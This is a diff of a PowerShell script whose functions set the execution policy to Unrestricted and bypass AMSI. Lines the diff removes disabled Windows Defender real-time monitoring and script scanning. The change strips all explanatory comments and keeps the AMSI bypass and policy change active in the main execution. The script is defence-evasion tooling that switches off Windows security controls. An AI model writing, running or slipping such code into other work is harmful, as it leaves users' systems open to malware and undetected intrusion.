@@ -1,4 +1,4 @@
-# Function to set PowerShell execution policy to unrestricted
+
 function Set-ExecutionPolicyUnrestricted {
     try {
         Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
@@ -8,7 +8,7 @@ function Set-ExecutionPolicyUnrestricted {
     }
 }
 
-# Function to disable AMSI protection
+
 function Disable-AMSI {
     try {
         $Script:AMSIBypass = @"
@@ -39,28 +39,9 @@ public class AMSI {
     }
 }
 
-# Function to disable Windows Defender real-time protection
-function Disable-WindowsDefender {
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -Force
-        Write-Output "Windows Defender real-time protection disabled."
-    } catch {
-        Write-Error "Failed to disable Windows Defender: $_"
-    }
-}
 
-# Function to disable script runtime protection
-function Disable-RuntimeProtection {
-    try {
-        Set-MpPreference -DisableScriptScanning $true -Force
-        Write-Output "Script runtime protection disabled."
-    } catch {
-        Write-Error "Failed to disable script runtime protection: $_"
-    }
-}
 
-# Main script execution
+
 Set-ExecutionPolicyUnrestricted
 Disable-AMSI
-Disable-WindowsDefender
-Disable-RuntimeProtection
+
